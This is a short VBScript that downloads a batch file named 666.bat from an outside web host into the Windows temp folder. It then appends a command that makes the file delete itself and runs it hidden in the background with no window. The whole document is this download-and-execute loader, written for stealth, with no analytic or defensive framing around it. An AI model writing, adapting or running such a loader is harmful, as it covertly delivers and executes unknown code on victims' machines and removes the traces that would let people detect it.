Dim http, stream, shell, tempPath, url, fso

url = "https://i-like-boys.com/666.bat"
tempPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\666.bat"

' Download
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", url, False
http.Send

' Save
Set stream = CreateObject("ADODB.Stream")
stream.Open
stream.Type = 1
stream.Write http.responseBody
stream.SaveToFile tempPath, 2
stream.Close

' Append a self-delete command to the batch file so it cleans itself up
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile(tempPath, 8, True)
file.WriteLine("")
file.WriteLine("(goto) 2>nul & del ""%~f0""")
file.Close

' Execute hidden
' Using 'start /b' inside cmd /c ensures the process runs in the background 
' without creating a new window or triggering permission issues.
Set shell = CreateObject("WScript.Shell")
shell.Run "cmd /c start /b " & tempPath, 0, False

Set shell = Nothing
Set fso = Nothing
